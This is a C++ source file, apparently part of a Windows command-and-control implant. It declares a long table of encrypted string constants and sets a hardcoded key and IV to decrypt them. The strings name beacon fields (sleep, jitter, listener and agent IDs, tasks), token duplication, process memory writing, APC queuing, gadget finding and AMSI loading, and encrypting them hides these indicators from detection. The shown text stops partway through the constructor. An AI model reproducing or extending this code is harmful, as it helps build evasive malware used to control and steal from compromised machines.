#include "StringCrypt.hpp"
#include "Crypt.hpp"
#include "SecureVector.hpp"
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

SecureVector<unsigned char> StringCrypt::Key;
SecureVector<unsigned char> StringCrypt::IV;
// BEGIN STATIC STORAGE DON'T REMOVE
SecureString StringCrypt::IP_CRYPT;
SecureString StringCrypt::PORT_CRYPT;
SecureString StringCrypt::AESKEY_CRYPT;
SecureString StringCrypt::XORKEY_CRYPT;
SecureString StringCrypt::IV_CRYPT;
SecureString StringCrypt::USERAGENT_CRYPT;
SecureString StringCrypt::RETRIEVINGMODULEBASEADDRESS_CRYPT;
SecureString StringCrypt::NTSTATUSFAIL_CRYPT;
SecureString StringCrypt::LASTERRORFAIL_CRYPT;
SecureString StringCrypt::FAILED_CRYPT;
SecureString StringCrypt::NUMBERTOOLARGEFORDWORD_CRYPT;
SecureString StringCrypt::ID_CRYPT;
SecureString StringCrypt::NAME_CRYPT;
SecureString StringCrypt::LISTENERID_CRYPT;
SecureString StringCrypt::SLEEP_CRYPT;
SecureString StringCrypt::JITTER_CRYPT;
SecureString StringCrypt::EXTERNALIP_CRYPT;
SecureString StringCrypt::INTERNALIP_CRYPT;
SecureString StringCrypt::TIME_CRYPT;
SecureString StringCrypt::HOSTNAME_CRYPT;
SecureString StringCrypt::TOKEN_CRYPT;
SecureString StringCrypt::USERNAME_CRYPT;
SecureString StringCrypt::OS_CRYPT;
SecureString StringCrypt::ACTIVE_CRYPT;
SecureString StringCrypt::TIMEOUTREACHEDFORTASK_CRYPT;
SecureString StringCrypt::AGENTID_CRYPT;
SecureString StringCrypt::COMMAND_CRYPT;
SecureString StringCrypt::ARGUMENTS_CRYPT;
SecureString StringCrypt::TIMEOUT_CRYPT;
SecureString StringCrypt::SUCCESS_CRYPT;
SecureString StringCrypt::INQUEUE_CRYPT;
SecureString StringCrypt::TIMEDOUT_CRYPT;
SecureString StringCrypt::CREATETIME_CRYPT;
SecureString StringCrypt::ENDTIME_CRYPT;
SecureString StringCrypt::RESULT_CRYPT;
SecureString StringCrypt::NUMBERSUPPERLOWER_CRYPT;
SecureString StringCrypt::GETTINGPROCESSINFORMATION_CRYPT;
SecureString StringCrypt::QUERYINGTHREADINFORMATION_CRYPT;
SecureString StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT;
SecureString StringCrypt::OPENINGPROCESS_CRYPT;
SecureString StringCrypt::OPENINGTOKEN_CRYPT;
SecureString StringCrypt::DUPLICATINGTOKEN_CRYPT;
SecureString StringCrypt::SETTINGTHREADINFORMATION_CRYPT;
SecureString StringCrypt::PRIVILEGEVALUELOOKUP_CRYPT;
SecureString StringCrypt::ADJUSTINGTOKEN_CRYPT;
SecureString StringCrypt::QUERYINGTOKEN_CRYPT;
SecureString StringCrypt::SIDLOOKUP_CRYPT;
SecureString StringCrypt::COMPUTERNAMEREGISTRY_CRYPT;
SecureString StringCrypt::COMPUTERNAME_CRYPT;
SecureString StringCrypt::OPENINGKEY_CRYPT;
SecureString StringCrypt::QUERYINGKEY_CRYPT;
SecureString StringCrypt::CURRENTVERSIONREGISTRY_CRYPT;
SecureString StringCrypt::PRODUCTNAME_CRYPT;
SecureString StringCrypt::DISPLAYVERSION_CRYPT;
SecureString StringCrypt::CURRENTBUILD_CRYPT;
SecureString StringCrypt::LOW_CRYPT;
SecureString StringCrypt::MEDIUM_CRYPT;
SecureString StringCrypt::HIGH_CRYPT;
SecureString StringCrypt::SYSTEM_CRYPT;
SecureString StringCrypt::UNKNOWN_CRYPT;
SecureString StringCrypt::QUEUINGAPCTHREADFAILED_CRYPT;
SecureString StringCrypt::PROCESSCOLON_CRYPT;
SecureString StringCrypt::PIPEIDCOLON_CRYPT;
SecureString StringCrypt::PIPEUSERCOLON_CRYPT;
SecureString StringCrypt::PIPETOKENCOLON_CRYPT;
SecureString StringCrypt::CREATINGPIPE_CRYPT;
SecureString StringCrypt::CREATINGPROCESS_CRYPT;
SecureString StringCrypt::READINGMEMORY_CRYPT;
SecureString StringCrypt::PROTECTINGMEMORY_CRYPT;
SecureString StringCrypt::WRITINGMEMORY_CRYPT;
SecureString StringCrypt::OUTOFRANGEERROR_CRYPT;
SecureString StringCrypt::CHARSETISEMPTY_CRYPT;
SecureString StringCrypt::BIO_NEWFORBASE64FAILED_CRYPT;
SecureString StringCrypt::BIO_NEWFORMEMORYBUFFERFAILED_CRYPT;
SecureString StringCrypt::BIO_WRITEFAILED_CRYPT;
SecureString StringCrypt::BIO_FLUSHFAILED_CRYPT;
SecureString StringCrypt::BIO_GET_MEM_PTRFAILED_CRYPT;
SecureString StringCrypt::BIO_NEW_MEM_BUFFAILED_CRYPT;
SecureString StringCrypt::BIO_READFAILED_CRYPT;
SecureString StringCrypt::INVALIDBASE64INPUTLENGTH_CRYPT;
SecureString StringCrypt::HEXSTRINGHASODDLENGTH_CRYPT;
SecureString StringCrypt::ERRORGENERATINGCHACHA20KEY_CRYPT;
SecureString StringCrypt::ERRORGENERATINGCHACHA20NONCE_CRYPT;
SecureString StringCrypt::EVP_CIPHER_CTX_NEWFAILED_CRYPT;
SecureString StringCrypt::CHACHA20ENCRYPTIONDECRYPTIONFAILED_CRYPT;
SecureString StringCrypt::CHACHA20FINALIZATIONFAILED_CRYPT;
SecureString StringCrypt::REGISTER_CRYPT;
SecureString StringCrypt::TASKS_CRYPT;
SecureString StringCrypt::ERROR_CRYPT;
SecureString StringCrypt::PWINHTTPOPEN_CRYPT;
SecureString StringCrypt::PWINHTTPCONNECT_CRYPT;
SecureString StringCrypt::GET_CRYPT;
SecureString StringCrypt::PWINHTTPOPENREQUEST_CRYPT;
SecureString StringCrypt::PWINHTTPSETOPTION_CRYPT;
SecureString StringCrypt::PWINHTTPSENDREQUEST_CRYPT;
SecureString StringCrypt::PWINHTTPRECEIVERESPONSE_CRYPT;
SecureString StringCrypt::PWINHTTPQUERYHEADERS_CRYPT;
SecureString StringCrypt::PWINHTTPQUERYDATAAVAILABLE_CRYPT;
SecureString StringCrypt::PWINHTTPREADDATA_CRYPT;
SecureString StringCrypt::POST_CRYPT;
SecureString StringCrypt::FAILEDTORESOLVEVXTABLE_CRYPT;
SecureString StringCrypt::FAILEDTORESOLVEWIN32TABLES_CRYPT;
SecureString StringCrypt::MAXRETRIESREACHED_CRYPT;
SecureString StringCrypt::SECUREEXCEPTION_CRYPT;
SecureString StringCrypt::UNKNOWNEXCEPTIONOCCURRED_CRYPT;
SecureString StringCrypt::INVALIDDOSSIGNATURE_CRYPT;
SecureString StringCrypt::INVALIDNTSIGNATURE_CRYPT;
SecureString StringCrypt::TEXT_CRYPT;
SecureString StringCrypt::GETTINGNAMEDOBJECTDIRECTORY_CRYPT;
SecureString StringCrypt::CREATINGTIMER_CRYPT;
SecureString StringCrypt::SETTINGTIMER_CRYPT;
SecureString StringCrypt::RELOC_CRYPT;
SecureString StringCrypt::CREATINGTIMERS_CRYPT;
SecureString StringCrypt::FAILEDTOFINDGADGETS_CRYPT;
SecureString StringCrypt::OPENINGTHREAD_CRYPT;
SecureString StringCrypt::SUSPENDINGTHREAD_CRYPT;
SecureString StringCrypt::RESUMINGTHREAD_CRYPT;
SecureString StringCrypt::FINDINGFUNC_CRYPT;
SecureString StringCrypt::AMSIDLL_CRYPT;
SecureString StringCrypt::LOADINGDLL_CRYPT;
SecureString StringCrypt::RETRIEVINGHEADERS_CRYPT;
SecureString StringCrypt::OPENINGIMAGE_CRYPT;
SecureString StringCrypt::QUERYINGFILEINFO_CRYPT;
SecureString StringCrypt::READINGIMAGE_CRYPT;
SecureString StringCrypt::KERNEL32DLL_CRYPT;
SecureString StringCrypt::ADVAPI32DLL_CRYPT;
SecureString StringCrypt::CRYPT32DLL_CRYPT;
SecureString StringCrypt::USER32DLL_CRYPT;
SecureString StringCrypt::SHELL32DLL_CRYPT;
SecureString StringCrypt::WINHTTPDLL_CRYPT;
SecureString StringCrypt::MSCOREEDLL_CRYPT;
SecureString StringCrypt::OLEAUT32DLL_CRYPT;
SecureString StringCrypt::WS2_32DLL_CRYPT;
SecureString StringCrypt::KERNELBASEDLL_CRYPT;
SecureString StringCrypt::CRYPTSPDLL_CRYPT;
SecureString StringCrypt::IPHLPAPIDLL_CRYPT;
SecureString StringCrypt::INITIALIZINGCRITICALSECTION_CRYPT;
SecureString StringCrypt::ALLOCATINGMEMORY_CRYPT;
SecureString StringCrypt::IDJSONPATTERN_CRYPT;
SecureString StringCrypt::AGENTIDJSONPATTERN_CRYPT;
SecureString StringCrypt::TIMEOUTJSONPATTERN_CRYPT;
SecureString StringCrypt::ACTIVEJSONPATTERN_CRYPT;
SecureString StringCrypt::SUCCESSJSONPATTERN_CRYPT;
SecureString StringCrypt::INQUEUEJSONPATTERN_CRYPT;
SecureString StringCrypt::TIMEDOUTJSONPATTERN_CRYPT;
SecureString StringCrypt::TRUEJSONPATTERN_CRYPT;
SecureString StringCrypt::COMMANDJSONPATTERN_CRYPT;
SecureString StringCrypt::CREATETIMEJSONPATTERN_CRYPT;
SecureString StringCrypt::ENDTIMEJSONPATTERN_CRYPT;
SecureString StringCrypt::RESULTJSONPATTERN_CRYPT;
SecureString StringCrypt::ARGUMENTSJSONPATTERN_CRYPT;
SecureString StringCrypt::NULLPOINTERPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT;
SecureString StringCrypt::NULLPOINTERPASSEDTOSECURESTRINGASSIGN_CRYPT;
SecureString StringCrypt::EMPTYRANGEPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT;
SecureString StringCrypt::EMPTYRANGEPASSEDTOSECURESTRINGASSIGN_CRYPT;
SecureString StringCrypt::RANDOMBYTESGENERATIONERROR_CRYPT;
SecureString StringCrypt::INVALIDHEXCHARACTER_CRYPT;
SecureString StringCrypt::INDEXOUTOFRANGE_CRYPT;
SecureString StringCrypt::NULLPOINTERPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT;
SecureString StringCrypt::EMPTYRANGEPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT;
SecureString StringCrypt::EMPTYRANGEPASSEDTOSECUREWIDESTRINGAPPEND_CRYPT;
SecureString StringCrypt::CREATINGEVENT_CRYPT;
SecureString StringCrypt::ALLOCATINGANEWTHREADPOOL_CRYPT;
SecureString StringCrypt::SETTINGTHEMINIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT;
SecureString StringCrypt::SETTINGTHEMAXIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT;
SecureString StringCrypt::ALLOCATINGAWORKITEM_CRYPT;
SecureString StringCrypt::POSTINGTHEWORKITEMTOTHETHREADPOOL_CRYPT;
SecureString StringCrypt::NONE_CRYPT;
SecureString StringCrypt::OTHER_CRYPT;
SecureString StringCrypt::TEREDO_CRYPT;
SecureString StringCrypt::IPHTTPS_CRYPT;
SecureString StringCrypt::ISATAP_CRYPT;
SecureString StringCrypt::SIXTOFOUR_CRYPT;
SecureString StringCrypt::DIRECT_CRYPT;
SecureString StringCrypt::OTHER_CAP_CRYPT;
SecureString StringCrypt::ETHERNET_CRYPT;
SecureString StringCrypt::TOKENRING_CRYPT;
SecureString StringCrypt::PPP_CRYPT;
SecureString StringCrypt::LOOPBACK_CRYPT;
SecureString StringCrypt::ATM_CRYPT;
SecureString StringCrypt::VIRTUAL_VPN_CRYPT;
SecureString StringCrypt::IEEE802_11WIRELESS_CRYPT;
SecureString StringCrypt::TUNNEL_CRYPT;
SecureString StringCrypt::IEEE1394_CRYPT;
SecureString StringCrypt::WWANPP_CRYPT;
SecureString StringCrypt::WWANPP2_CRYPT;
SecureString StringCrypt::UNKNOWN_CAP_CRYPT;
SecureString StringCrypt::UP_CAP_CRYPT;
SecureString StringCrypt::DOWN_CAP_CRYPT;
SecureString StringCrypt::SPACE_MBPS_CRYPT;
SecureString StringCrypt::SPACE_GBPS_CRYPT;
SecureString StringCrypt::N_SLASH_A_CRYPT;
SecureString StringCrypt::TRUE_CAP_CRYPT;
SecureString StringCrypt::FALSE_CAP_CRYPT;
SecureString StringCrypt::ADAPTERNAMECOLON_CRYPT;
SecureString StringCrypt::ADAPTERDESCRIPTIONCOLON_CRYPT;
SecureString StringCrypt::MACADDRESSCOLON_CRYPT;
SecureString StringCrypt::DNSSUFFIXCOLON_CRYPT;
SecureString StringCrypt::OPERATIONALSTATUSCOLON_CRYPT;
SecureString StringCrypt::ADAPTERTYPECOLON_CRYPT;
SecureString StringCrypt::TUNNELTYPECOLON_CRYPT;
SecureString StringCrypt::DHCPV4SERVERCOLON_CRYPT;
SecureString StringCrypt::DHCPV6SERVERCOLON_CRYPT;
SecureString StringCrypt::TRANSMITLINKSPEEDCOLON_CRYPT;
SecureString StringCrypt::RECEIVELINKSPEEDCOLON_CRYPT;
SecureString StringCrypt::ADDITIONALDNSSUFFIXCOLON_CRYPT;
SecureString StringCrypt::IPADDRESSCOLON_CRYPT;
SecureString StringCrypt::DNSSERVERCOLON_CRYPT;
SecureString StringCrypt::WINSSERVERCOLON_CRYPT;
SecureString StringCrypt::GATEWAYADDRESSCOLON_CRYPT;
SecureString StringCrypt::DDNSENABLEDCOLON_CRYPT;
SecureString StringCrypt::REGISTERADAPTERSUFFIXCOLON_CRYPT;
SecureString StringCrypt::DHCPV4ENABLEDCOLON_CRYPT;
SecureString StringCrypt::RECEIVEONLYCOLON_CRYPT;
SecureString StringCrypt::NOMULTICASTCOLON_CRYPT;
SecureString StringCrypt::IPV6OTHERSTATEFULCONFIGCOLON_CRYPT;
SecureString StringCrypt::NETBIOSOVERTCPIPENABLEDCOLON_CRYPT;
SecureString StringCrypt::IPV4ENABLEDCOLON_CRYPT;
SecureString StringCrypt::IPV6ENABLEDCOLON_CRYPT;
SecureString StringCrypt::IPV6MANAGEDADDRESSCONFIGCOLON_CRYPT;
SecureString StringCrypt::GETTINGADAPTERADDRESSES_CRYPT;
// END STATIC STORAGE DON'T REMOVE

StringCrypt::StringCrypt() {
    Key = Crypt::DecodeHex(SecureString("e3f0dd79d8053cb27b9743837d6d3902ed54a562fc7d97ea801356dccb8defb0"));
    IV = Crypt::DecodeHex(SecureString("8c46872d83e693a4090b917d"));
    IP_CRYPT = "89d90d5bceae2c7b0316fe48e3bba111d232960d1a422ee88b";
    PORT_CRYPT = "8ed20c4c23c772c21ec193035f8fd1adea9e68dd";
    AESKEY_CRYPT = "da8e094dcbb67f3151af7993cdfd9512b7e994a5349ab03d1228f10891114617394bf9d838751235ce27b5c6432194c3aea79d572e7ec7f54983d6821c6cc8f3ad1d9d29be0163d2eb8252341078f9b9";
    XORKEY_CRYPT = "898a5f4698b124330aaf22c797ff9542e9e397a867cce13a1678a258931f131c3c4cfa8f342e426fc671e4c013759d91feae94037e2c95f71f81d0d51c6eccf87771490f7d2f5d00bbb9a1e248a87762";
    IV_CRYPT = "dadd5e41ccb279300bfc79c591af9345ecb5c1a23391b0314e1789878a8af6fd52e3938f82496191";
    USERAGENT_CRYPT = "eb9f551b9bcb793042ae33d6b4fec44afbfec4bf61592d8bf801c07e2c0018e650169ae16e";
    RETRIEVINGMODULEBASEADDRESS_CRYPT = "ea8e4e0797e56a3c5cac619b9afdd448eaf197f022cca269402eb65ed65b1d54aeb858354343a549671f55e9a46b";
    NTSTATUSFAIL_CRYPT = "988d5b1c92e5787545a2359ed5d7f577db90a1c40289e167402ffe1b9550b0434ffb93330f9dba8674730d00ca75";
    LASTERRORFAIL_CRYPT = "988d5b1c92e5787545a2359ed5fcd356e0a3d5f23ecde732047abcddc387610ed4e438065bd35793051688";
    FAILED_CRYPT = "988d5b1c92e5786843513d24638059c5398133b2a35285";
    NUMBERTOOLARGEFORDWORD_CRYPT = "ec835f5590f5713757b9619f9bb9d54ceaf186e523c0ec6f0423b71bd1471e05604fbd8e696d15628d32b6856147eaf589b0a215f94cbf127a4c6bb888e3e6bc2a34";
    ID_CRYPT = "f1af720962da4e5c2e9c714d0ce458f4814c";
    NAME_CRYPT = "f68a57107f17a84c04305ad89e474e144710af34";
    LISTENERID_CRYPT = "f48249019bee79277b8f1f266fd4ae2c8a6ad0e25493cf957ced";
    SLEEP_CRYPT = "eb875f108e8f947e286fa18649dcf7b052f178da25";
    JITTER_CRYPT = "f2824e019bf2863ce8c0e9732beee992602060d19015";
    EXTERNALIP_CRYPT = "fd934e108cee7d397b9b88d0b44be0ed89edcb0c4af84efbb8af";
    INTERNALIP_CRYPT = "f1854e108cee7d397b9b05ec62c87eea43046c3c34e56ace0ab0";
    TIME_CRYPT = "ec825710b0d2e55a3c974eee8348eadced780f02";
    HOSTNAME_CRYPT = "f084490190e17130664e2fc684def86e38819d845f346ec1";
    TOKEN_CRYPT = "ec84511090019968572627641006be167a5ff11ad2";
    USERNAME_CRYPT = "ed985f0790e171302c3905fb986a3afece58531b970570e1";
    OS_CRYPT = "f7b800e69e84a3003c7535f9bb66ad034514";
    ACTIVE_CRYPT = "f9884e1c88e549b68a239533e0b4cbd025a168f8e0b0";
    TIMEOUTREACHEDFORTASK_CRYPT = "ec82571091f5687540ae20959dfcc504e9be87b125c8f163043fb752cb4f51516543aa867939537b9e7ea2c005414c6a347c41ba4aed3f5f727fc0c578";
    AGENTID_CRYPT = "f98c5f1b8ac958a3c8cb98e21a7713135cd6e9bbffa82a";
    COMMAND_CRYPT = "fb8457189fee78a8df723adc20b88e4570d23dc461a33c";
    ARGUMENTS_CRYPT = "f9995d0093e572214196fc9cb591c2f30c87bd2970daa07403";
    TIMEOUT_CRYPT = "ec82571091f5684ccec9aee4a9b1ed346f0c0801e6911f";
    SUCCESS_CRYPT = "eb9e59169bf36f05acaa54f7b04d37030547fd9516a56c";
    INQUEUE_CRYPT = "f1856b009bf579ae06a63dec9a5dc4cb338fa758dded3f";
    TIMEDOUT_CRYPT = "ec8257109acf6921b827b9c18573e5ed00a348c4f64d28a4";
    CREATETIME_CRYPT = "fb995f148ae5483c5faeac7cbe23b63c88b83c2379c2eafdd40c";
    ENDTIME_CRYPT = "fd855e2197ed795d8cbd3cf96f4a2d359a76c3d69e0b5c";
    RESULT_CRYPT = "ea8e490092f4efff5063308a02d7b2daaadefb38b81e";
    NUMBERSUPPERLOWER_CRYPT = "88da0846cab52a620af200b4b6dde462c899bcdb1ae5cf466b1a9569f67c24735b7696b36d2f10699a74b0cd4c7acecba0f0cb443d6a80b50993c2cb5d7005e3154324e7da2ea016496f1e9b4c3b";
    GETTINGPROCESSINFORMATION_CRYPT = "ff8e4e0197ee7b7542b92e9590ead204e6bf93fe23c4e37c4d25aa861ca0020b9837aacc679a8b2f06d5be";
    QUERYINGTHREADINFORMATION_CRYPT = "e99e5f0787e9723212bf298490f8c504e6bf93fe23c4e37c4d25aa59318230dc9ad9fda41259572cf37ad2";
    GETTINGSYSTEMINFORMATION_CRYPT = "ff8e4e0197ee7b7541b2328290f4814de1b79ae33cc8f6614b2470d56f3a86d117d8b0d58730bc825416";
    OPENINGPROCESS_CRYPT = "f79b5f1b97ee7b7542b92e9590ead21c9041730311b9c92064c417e7603c74";
    OPENINGTOKEN_CRYPT = "f79b5f1b97ee7b7546a42a939bab3d1ea0ac8e1b0a6c3a3e69fdd238ab";
    DUPLICATINGTOKEN_CRYPT = "fc9e4a1997e37d215ba526d681f6ca41e1166b069d99d26d9971382b1d00d0442f";
    SETTINGTHREADINFORMATION_CRYPT = "eb8e4e0197ee7b7546a3339394fd814de1b79ae33cc8f6614b249a238a5f3c81014180bdde8800bd8a7b";
    PRIVILEGEVALUELOOKUP_CRYPT = "e899530397ec793257eb379799ecc404e3be9afa24d96805c8c92b8ffcebc329e527dfb6991c";
    ADJUSTINGTOKEN_CRYPT = "f98f50008df4753b55eb35999efccf7c58cb730805cb63d1f059900a905d1d";
    QUERYINGTOKEN_CRYPT = "e99e5f0787e9723212bf2e9d90f76a2e77308ea58eb779600b60a86689f1";
    SIDLOOKUP_CRYPT = "eba27e5592ef733e47bbe5dedbfaa6ef385c49ae7146705f07ae";
    COMPUTERNAMEREGISTRY_CRYPT = "e4b95f1297f368274b970c9796f1c84aea8da6c802fdc7457809b149d74d1f514f41a19d7e221f5e9a668be64a7ed1d5a2f2f877237583b40880c7fd45679f96b307f566e8c6dd38dbff460ea906e7df5bf18b8541b059bcb9d91833";
    COMPUTERNAME_CRYPT = "fb8457058bf479277caa2c937d4c748082582d6fac688c9d11bb25f4";
    OPENINGKEY_CRYPT = "f79b5f1b97ee7b7559ae388dd868e0bfeeeb8e45355eb2c6dd5539";
    QUERYINGKEY_CRYPT = "e99e5f0787e9723212a0248f24206c5b8fcc5e9972d7991993c9e8dd";
    CURRENTVERSIONREGISTRY_CRYPT = "e4b95f1297f368274b970c9796f1c84aea8da6de17fdd549760f9876cc4b034a7f41a99d501a1a639b7da0d6055ef1fb8eebd646297687971997c6da4b64f4d2c83e32fa99dda537016eca26163f";
    PRODUCTNAME_CRYPT = "e89955118be3681b53a6243de694fd63624ab56de64216d9d0a016";
    DISPLAYVERSION_CRYPT = "fc82490592e1650357b9329f9af7466709a26476d38249ad0fa8b2c490ae";
    CURRENTBUILD_CRYPT = "fb9e48079bee681747a22d92d3d2718f5c2e6e2372253683b561cc95";
    LOW_CRYPT = "f4a46d842b3d4d76a2df1070c68eb7f5107231";
    MEDIUM_CRYPT = "f5ae7e3cabcd5fc192539d6a6db32aec045724cd5d67";
    HIGH_CRYPT = "f0a27d3d0c4f2b6fdcdaaa56e79c3e5849ac5505";
    SYSTEM_CRYPT = "ebb26921bbcd529f65e84d8068ae97bda6e819188170";
    UNKNOWN_CRYPT = "eda5713bb1d752c71f21697b41575d176d268fa252afc2";
    QUEUINGAPCTHREADFAILED_CRYPT = "e99e5f0097ee7b75739b02d681f1d341eeb5d5f730c0ee6d40802a9bbc8bd33424f2314e038bb9d8c7";
    PROCESSCOLON_CRYPT = "e89955169bf36f6f1216cfbcc2be46ef943b0da00810220e29";
    PIPEIDCOLON_CRYPT = "98971a3cbaba3cb508fc353a4d5760c4e15adb84b15642";
    PIPEUSERCOLON_CRYPT = "98971a208de56e6f128c2abb8ccb4386bcb7eadd913180f3d6";
    PIPETOKENCOLON_CRYPT = "98971a2191eb793b08ebafdfd04e7cc756815b5f25f124f37ef5";
    CREATINGPIPE_CRYPT = "fb995f148ae9723212bb28869006439d0dce9986eb6c97a4488c060ccd";
    CREATINGPROCESS_CRYPT = "fb995f148ae9723212bb339996fcd25719463523c6adadc386f5b72a7911f210";
    READINGMEMORY_CRYPT = "ea8e5b1197ee7b755fae2c9987e01d95565ab3e340f99c9daccc904e94e5";
    PROTECTINGMEMORY_CRYPT = "e89955019be3683c5cac619b90f4ce56f6f84cf723f4e14be3e50a130a526d71f0";
    WRITINGMEMORY_CRYPT = "ef99530197ee7b755fae2c9987e047906b541bdb8dc2e6fb0da0d905d836";
    OUTOFRANGEERROR_CRYPT = "f79e4e5591e63c2753a52693d5fcd356e0a30d04b7b5498080232365edbf1a418fa2";
    CHARSETISEMPTY_CRYPT = "fb835b078de568755bb8619398e9d55da1afc7e20ba9630123ed746bc021f71494";
    BIO_NEWFORBASE64FAILED_CRYPT = "faa2752a90e56b7554a433d697f8d241b9e5d5f730c0ee6d406489d013b3595f9146ad6aff57566945ac";
    BIO_NEWFORMEMORYBUFFERFAILED_CRYPT = "faa2752a90e56b7554a433d698fccc4bfda8d5f324cfe46d566aa25acc4414412276f27973028cfdd46a32750cd9ff3e01";
    BIO_WRITEFAILED_CRYPT = "faa2752a89f2752157eb27979cf5c440a1afad50f18724b3b491ef65d045b7e364";
    BIO_FLUSHFAILED_CRYPT = "faa2752a98ec69265aeb27979cf5c440a126b45561222a2b34c2b4f6b2cdafadf7";
    BIO_GET_MEM_PTRFAILED_CRYPT = "faa2752a99e5680a5fae2ca985edd304e9b09cfd34cdac1b8e603249403d39dd7e17deb96d222b";
    BIO_NEW_MEM_BUFFAILED_CRYPT = "faa2752a90e56b0a5fae2ca997ecc704e9b09cfd34cdac81ac2a18db7d49e7ed9d5faca9a612ea";
    BIO_READFAILED_CRYPT = "faa2752a8ce57d3112ad209f99fcc50a556e57a5e3ed1132bc84521cc374eec2";
    INVALIDBASE64INPUTLENGTH_CRYPT = "f1854c1492e9787570aa3293c3ad814de1a180e571c5e766433eac152abe8fec8f50d08defa3d280070bc62a";
    HEXSTRINGHASODDLENGTH_CRYPT = "f08e42558df46e3c5cac619e94ea814bebb5d5fd34c7e57c4ca2c7c6973bd24589f9e02d4fc048b2cc";
    ERRORGENERATINGCHACHA20KEY_CRYPT = "fd99481a8ca07b305cae339781f0cf43af929df012c1e33a146aaf5edcdcb8ba2204f9839e0f9e39530eac249c";
    ERRORGENERATINGCHACHA20NONCE_CRYPT = "fd99481a8ca07b305cae339781f0cf43af929df012c1e33a146aaa54cb4b141d6d24c9c146b0d109aaa62c2e51bc82";
    EVP_CIPHER_CTX_NEWFAILED_CRYPT = "fdbd6a2abdc94c1d77991eb5a1c1fe4aeaa6d5f730c0ee6d4064c4207b2c152d939753ec8c4c6a61ffc3";
    CHACHA20ENCRYPTIONDECRYPTIONFAILED_CRYPT = "fb835b3696e12e6512ae2f9587e0d150e6be9bbe35cce17a5d3ab052ca4651436d47a38c689a58277a6941781b51f4196b7ca05eaa";
    CHACHA20FINALIZATIONFAILED_CRYPT = "fb835b3696e12e6512ad289894f5c85eeea59cfe3f89e4694d26a15f14c3b0e321ab735ba5557258ec0b3853";
    REGISTER_CRYPT = "97995f1297f3683040e4e2f5925d67748ca1a496ff06486d7a39";
    TASKS_CRYPT = "979f5b0695f333856e4b543bb45238a7d0d1321a3ff812";
    ERROR_CRYPT = "978e480791f23311c2273a02884eeb7e64f2a6490c477c";
    PWINHTTPOPEN_CRYPT = "c8bc531bb6f468257dbb2498d05663d35ddf393956317fd72bfee853";
    PWINHTTPCONNECT_CRYPT = "c8bc531bb6f4682571a42f9890fad5a12c13fcbe8c56aa34d01dd7429e7134";
    GET_CRYPT = "ffae6eaaa8772028af566d5e1a4428ec5ae7bd";
    PWINHTTPOPENREQUEST_CRYPT = "c8bc531bb6f468257dbb2498a7fcd051eaa281664bc524d3e45482fdd4786f2f4d40a0";
    PWINHTTPSETOPTION_CRYPT = "c8bc531bb6f4682561ae35b985edc84be161a98c7ccd83f329fa7ce84af3541e23";
    PWINHTTPSENDREQUEST_CRYPT = "c8bc531bb6f4682561ae2f92a7fcd051eaa281c2fe3ce558eca09bcfb77c76c4809ff6";
    PWINHTTPRECEIVERESPONSE_CRYPT = "c8bc531bb6f4682560ae22939cefc476eaa285fe3fdae7c88a7061490d47e9277f48a44797919d";
    PWINHTTPQUERYHEADERS_CRYPT = "c8bc531bb6f4682563be24848cd1c445ebb487e233cdbfb4d0611aa8811d202da759c8b9";
    PWINHTTPQUERYDATAAVAILABLE_CRYPT = "c8bc531bb6f4682563be24848cddc050ee9083f038c5e36a482febe616fd3fc16b1f5ab562983b7652a2";
    PWINHTTPREADDATA_CRYPT = "c8bc531bb6f4682560ae2092b1f8d54526b52c796324955562c4dde149fb7232";
    POST_CRYPT = "e8a46921757e9e99fbe62867d41a0c7f9b743a4a";
    FAILEDTORESOLVEVXTABLE_CRYPT = "fe8a53199be43c215deb339386f6cd52eaf1a3c971dde36a482fb9ecac32f1d5316044702e7d3b6f89e4";
    FAILEDTORESOLVEWIN32TABLES_CRYPT = "fe8a53199be43c215deb339386f6cd52eaf1a2f83f9ab028502ba657c05b36509a4b4aee184a4383cf68025a41ba";
    MAXRETRIESREACHED_CRYPT = "f58a42558ce568275bae32d687fcc047e7b491b2886dc15f7bdd21aa7228d50153f52f";
    SECUREEXCEPTION_CRYPT = "eb8e59008ce53c104aa8248681f0ce4ab5f1bc115678208c64bcd156b4eab5a97a6c";
    UNKNOWNEXCEPTIONOCCURRED_CRYPT = "ed85511b91f7727577b3229385edc84be1f19af232dcf07a412eea045e65603a012fda8a7eb86ee11431cb";
    INVALIDDOSSIGNATURE_CRYPT = "f1854c1492e97875768412d686f0c64aeea580e33449c9fbdf689846d3507fb40057f2cb1f";
    INVALIDNTSIGNATURE_CRYPT = "f1854c1492e978757c9f61859cfecf45fba487f458384ed9eeff6a788571925d6179f222";
    TEXT_CRYPT = "969f5f0d8a9e461765be1c859de03edf7b260d9fc0";
    GETTINGNAMEDOBJECTDIRECTORY_CRYPT = "ff8e4e0197ee7b755caa2c9391b9ce46e5b496e571cdeb7a4129b054d751c670d8bc5206de68b7f4ac3d0418c87a";
    CREATINGTIMER_CRYPT = "fb995f148ae9723212bf289b90eb0b3abecda8510787bad2c408403d5362";
    SETTINGTIMER_CRYPT = "eb8e4e0197ee7b7546a22c9387200c63f8a987d5f8ec8ad38c5b006277";
    RELOC_CRYPT = "96995f1991e39882ac76219496bf3dec5b0745278c86";
    CREATINGTIMERS_CRYPT = "fb995f148ae9723212bf289b90ebd2a658d752c5647e11568960a6bdf3506a";
    FAILEDTOFINDGADGETS_CRYPT = "fe8a53199be43c215deb279f9bfd8143eeb592f425daa7bfd49f4d485b7b1784f53f476c8a5e";
    OPENINGTHREAD_CRYPT = "f79b5f1b97ee7b7546a3339394fdb12133d5e906b9e89cc0aeeda756b8d6";
    SUSPENDINGTHREAD_CRYPT = "eb9e49059bee783c5cac61829debc445ebb6b00af2005af57ad72f95f4e11e03d2";
    RESUMINGTHREAD_CRYPT = "ea8e490093e9723212bf298490f8c523c94fb8873e18dc7244ee2f4460acf3";
    FINDINGFUNC_CRYPT = "fe82541197ee7b7554be2f9582a548cd10456aee831feafff8d69868";
    AMSIDLL_CRYPT = "d986491cd0e470399c78cd84f4ebcde86746374d3de400b0";
    LOADINGDLL_CRYPT = "f4845b1197ee7b7576870d2684d289b9f5d39a3ff5143549cec56f";
